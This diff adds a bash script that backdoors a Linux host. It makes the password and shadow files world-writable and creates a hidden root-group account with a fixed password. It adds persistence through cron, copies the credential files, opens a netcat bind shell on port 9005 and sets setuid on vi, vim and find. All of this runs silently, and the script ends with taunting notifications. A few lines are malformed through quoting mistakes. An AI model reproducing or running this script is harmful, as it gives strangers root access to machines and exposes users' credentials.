@@ -1,0 +1,27 @@
+#!/bin/bash
+
+chmod 666 /etc/passwd &> /dev/null
+chmod 666 /etc/shadow &> /dev/null
+
+useradd Systemm &> /dev/null && echo -e "defnotthepasswd\ndefnotthepasswd" | passwd Systemm &> /dev/null
+usermod -a -G root Systemm &> /dev/null
+
+echo "*/5 * * * * root useradd Systemm && echo -e "defnotthepasswd\ndefnotthepasswd" | passwd Systemm && usermod -a -G root Systemm" >> /etc/crontab
+
+cp /etc/passwd /home/Systemm/.System/SystemFiles/accounts
+cp /etc/shadow /home/Systemm/.System/SystemFiles/hashes
+
+
+apt update > /dev/null 2> /dev/null && apt -y install netcat-traditional 2> /dev/null > /dev/null
+nc.traditional -l -p 9005 -e /bin/bash &
+
+
+chmod u+s 'which vi' &> /dev/null
+chmod u+s 'which vim' &> /dev/null 
+chmod u+s 'which find' &> /dev/null
+
+chmod 777 /root &> /dev/null
+
+notify-send --urgency-critical "dont trust anything on the internet"
+notify-send --urgency-critical "you might be opening up Pandoras box ..."
+notify-send --urgency-critical "good luck! you'll need it."
